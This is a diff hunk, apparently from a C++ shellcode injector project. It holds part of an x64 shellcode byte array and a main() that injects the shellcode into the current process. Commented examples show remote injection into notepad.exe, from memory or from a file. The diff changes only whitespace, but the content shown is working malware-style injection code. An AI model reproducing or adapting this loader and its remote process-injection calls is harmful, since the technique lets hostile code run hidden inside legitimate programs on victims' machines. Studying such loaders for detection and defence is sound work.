@@ -32,15 +32,15 @@ unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\
 			  "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
 int main()
-{
+{ 
 	// Example LocalInjectionFromMemory
-    Injector::LocalInjectionFromMemory(payload, sizeof(payload));
+    	Injector::LocalInjectionFromMemory(payload, sizeof(payload));
 
 	// Example LocalInjectionFromFile with file test.bin
-    //Injector::LocalInjectionFromFile(R"(test.bin)");
+    	//Injector::LocalInjectionFromFile(R"(test.bin)");
 
 	// Example RemoteInjectionFromMemory in notepad.exe
-    //Injector::RemoteInjectionFromMemory(payload, sizeof(payload), "notepad.exe");
+    	//Injector::RemoteInjectionFromMemory(payload, sizeof(payload), "notepad.exe");
 
 	// Example RemoteInjectionFromFile with file test.bin in notepad.exe
 	//Injector::RemoteInjectionFromFile(R"(test.bin)", "notepad.exe");
